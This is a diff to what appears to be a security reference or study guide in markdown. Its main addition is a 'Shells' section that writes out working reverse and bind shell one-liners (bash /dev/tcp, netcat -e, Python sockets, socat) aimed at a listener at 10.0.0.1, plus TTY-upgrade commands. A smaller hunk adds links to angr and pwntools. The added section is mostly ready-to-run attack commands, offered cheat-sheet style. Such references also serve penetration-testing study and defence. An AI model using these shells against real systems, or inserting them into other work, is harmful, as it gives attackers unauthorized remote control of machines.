@@ -2193,6 +2193,50 @@ Movement from initial compromise to other systems within the network.
 - Track administrative tool usage (PsExec, WMI, PowerShell)
 - Analyze authentication logs for suspicious patterns
 
+### Shells
+
+#### Reverse/Bind Shells
+**Reverse Shell**: Target connects back to attacker's listening machine.
+```bash
+# Attacker (listener)
+nc -lvp 4444                          # Listen on port 4444
+
+# Target (reverse shell)
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1    # Bash reverse shell
+nc -e /bin/bash 10.0.0.1 4444             # Netcat reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # Python reverse shell
+```
+
+**Bind Shell**: Target opens port and waits for attacker connection.
+```bash
+# Target (bind shell)
+nc -lvp 4444 -e /bin/bash             # Netcat bind shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # Python bind shell
+
+# Attacker (connect)
+nc 10.0.0.2 4444                      # Connect to target
+```
+
+#### TTY Shell Upgrade
+**Problem**: Basic shells lack features (no tab completion, ctrl+c kills shell)  
+**Solution**: Upgrade to full interactive TTY shell
+```bash
+# Method 1: Python PTY
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z (background)
+stty raw -echo; fg
+# Enter twice
+
+# Method 2: Script command
+script -qc /bin/bash /dev/null
+
+# Method 3: Socat (if available)
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+# On target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+```
+
 ### Privilege Escalation
 Gaining higher-level permissions than initially obtained.
 
@@ -3411,8 +3455,12 @@ Symbolic execution is a program analysis technique that runs programs with **sym
 * Input generation for testing (coverage-guided).
 * Exploit generation by finding feasible, exploitable paths.
 
+[angr](https://angr.io/) is a popular Python framework for symbolic execution, combining static and dynamic analysis.
+
 ## Binary Exploitation
 Analysis and exploitation of compiled binaries to gain unauthorized access or control.
+
+[pwntools](https://docs.pwntools.com/en/stable/) is a powerful Python library for binary exploitation.
 
 ### Registers
 CPU registers are high-speed storage locations within the processor. In x86-64 architecture, understanding registers is crucial for binary exploitation.
